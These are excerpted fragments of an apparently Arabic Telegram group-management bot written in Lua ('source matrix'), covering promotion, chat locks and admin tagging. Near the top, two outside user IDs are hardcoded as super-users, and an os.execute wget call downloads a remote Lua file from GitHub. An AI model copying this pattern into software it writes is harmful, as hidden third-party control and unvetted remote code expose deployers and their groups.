...
SUDO = SUDO
sudo_users = {SUDO,258295856,1742704763}   
print([[
...
if tonumber(user_id) == tonumber(258295856) then  
var = true  
elseif tonumber(user_id) == tonumber(1742704763) then
var = true  
...
local UserName = (data.username_ or "VV_DF")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝘴𝘰𝘳𝘶𝘤𝘦 𝘮𝘢𝘵𝘳𝘪𝘹.")  
...
os.execute('wget https://raw.githubusercontent.com/MATRIXSR/MATRIX/main/MATRIX.lua')
...
usertext = '\n⌔∮العضو » ['..result.title_..'](t.me/'..(username or 'VV_DF')..')'
status  = '\n⌔∮تم ترقيته مطور'
...
usertext = '\n⌔∮العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'VV_DF')..')'
status  = '\n⌔∮تم ترقيته مطور'
...
if MATRIX1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔∮العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'VV_DF')..') \n⌔∮'..MATRIX1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"⌔∮العضو : {["..data.first_name_.."](T.ME/VV_DF)}\n⌔∮["..MATRIX_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⌔∮عذرا » {["..data.first_name_.."](T.ME/VV_DF)}\n⌔∮عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'⌔∮بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'VV_DF')..') \n⌔∮تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔∮بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'VV_DF')..') \n⌔∮تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔∮لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'VV_DF')..')'
status  = '\n⌔∮تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔∮العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔∮العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'VV_DF')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⌔∮العضو » ['..result.title_..'](t.me/'..(text1[3] or 'VV_DF')..')'..'\n⌔∮تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
{{text = '🖨┇𝘴𝘰𝘳𝘶𝘤𝘦 𝘮𝘢𝘵𝘳𝘪𝘹.',url="t.me/VV_DF"}},
}
...
database:set(bot_id.."VV_DF:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."VV_DF:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."VV_DF:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."VV_DF:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⌔︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."VV_DF:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."VV_DF:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'VV_DF')..')'
local iduser = result.sender_user_id_
...
{
{text = '𝑴𝑨𝑻𝑹𝑰𝑿 𝑪𝑯𝑨𝑵𝑵𝑬𝑳', url="t.me/VV_DF"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ*ٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ*\n⌔︙ ➫ .[🖨┇𝘴𝘰𝘳𝘶𝘤𝘦 𝘮𝘢𝘵𝘳𝘪𝘹](t.me/VV_DF)➤ ')
end
